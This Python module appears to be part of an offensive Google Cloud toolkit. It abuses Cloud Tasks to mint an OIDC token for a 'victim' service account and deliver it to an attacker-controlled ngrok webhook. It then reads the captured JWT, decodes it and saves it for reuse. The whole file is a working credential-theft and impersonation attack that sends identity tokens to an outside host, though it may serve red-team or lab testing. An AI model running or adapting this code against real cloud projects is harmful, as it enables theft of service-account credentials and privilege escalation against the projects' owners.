import os
import subprocess
import json
import base64
import re
import time
from google.cloud import tasks_v2
from google.protobuf import timestamp_pb2
from datetime import datetime, timedelta, timezone

from core.config import PROJECT_ID, REGION
from core.gcp_utils import get_cloud_run_url

# ----------- STEP 1: Create Cloud Task with OIDC Token ----------------

def create_cloud_task_with_oidc(project_id, location, queue_id, service_url, cloud_run_url, service_account_email):
    client = tasks_v2.CloudTasksClient()
    parent = client.queue_path(project_id, location, queue_id)

    # Set time in the future (optional)
    scheduled_time = datetime.now(timezone.utc) + timedelta(seconds=5)
    timestamp = timestamp_pb2.Timestamp()
    timestamp.FromDatetime(scheduled_time)

    task = {
        "http_request": {
            "http_method": tasks_v2.HttpMethod.POST,
            "url": service_url,
            "headers": {"Content-Type": "application/json"},
            "oidc_token": {
                "service_account_email": service_account_email,
                "audience": cloud_run_url
            },
            "body": b'{"attack": "triggered by OIDC task"}',
        },
        "schedule_time": timestamp
    }

    response = client.create_task(parent=parent, task=task)
    return response.name

# ----------- STEP 2: Extract JWT from Webhook ----------------------------

def extract_jwt_from_webhook(timeout=20):
    token_path = "modules/common/captured_token.txt"
    start_time = time.time()

    while time.time() - start_time < timeout:
        if os.path.exists(token_path):
            try:
                with open(token_path, "r") as f:
                    token = f.read().strip()
                    return token
            except Exception as e:
                print(f"[!] Error reading JWT file: {e}")
                return None
        time.sleep(1)

    print("[!] Timeout: JWT file not found.")
    return None


# ----------- STEP 3: Decode JWT --------------------------------------

def decode_jwt(jwt_token):
    try:
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return None
        payload = parts[1]
        padded = payload + '=' * (-len(payload) % 4)
        decoded = base64.urlsafe_b64decode(padded)
        return json.loads(decoded)
    except Exception as e:
        print(f"Error decoding JWT: {e}")
        return None


# ----------- MAIN EXECUTION ------------------------------------------

def main():

    with open("modules/abuse_cloud_tasks/queue_id.txt", "r") as f:
        queue_id = f.read().strip()
    # Cargar la URL previamente guardada
    with open("webhook_url.txt", "r") as f:
        service_url = f.read().strip()

    print(f"[v] Ngrok URL loaded: {service_url}")
    
    with open("cloud_run_real_url.txt", "r") as f:
        cloud_run_url = f.read().strip()

    victim_sa = f"victim-sa-test@{PROJECT_ID}.iam.gserviceaccount.com"

    try:
        print("[+] Creating Cloud Task to impersonate:", victim_sa)
        task_name = create_cloud_task_with_oidc(PROJECT_ID, REGION, queue_id, service_url, cloud_run_url, victim_sa)
        print(f"Cloud Task created: {task_name}")
    except Exception as e:
        print(f"Failed to create Cloud Task: {e}")
        return

    print("[i] Waiting 10 seconds for Cloud Run to process the task...")
    time.sleep(10)

    print("[+] Waiting for token to arrive via webhook (ngrok)...")
    time.sleep(5)  # opcional para dar margen a que se dispare la tarea

    jwt_token = extract_jwt_from_webhook()


    if jwt_token:
        print("[+] JWT successfully extracted")
        print("[i] Decoding JWT...\n")
        decoded = decode_jwt(jwt_token)

        if decoded:
            print(json.dumps(decoded, indent=2))
            with open("modules/abuse_cloud_tasks/last_token.jwt", "w") as f:
                f.write(jwt_token)
            print("[+] Token saved to: modules/abuse_cloud_tasks/last_token.jwt")
        else:
            print("Could not decode JWT.")
    else:
        print("No Bearer token found in logs.")

if __name__ == "__main__":
    main()
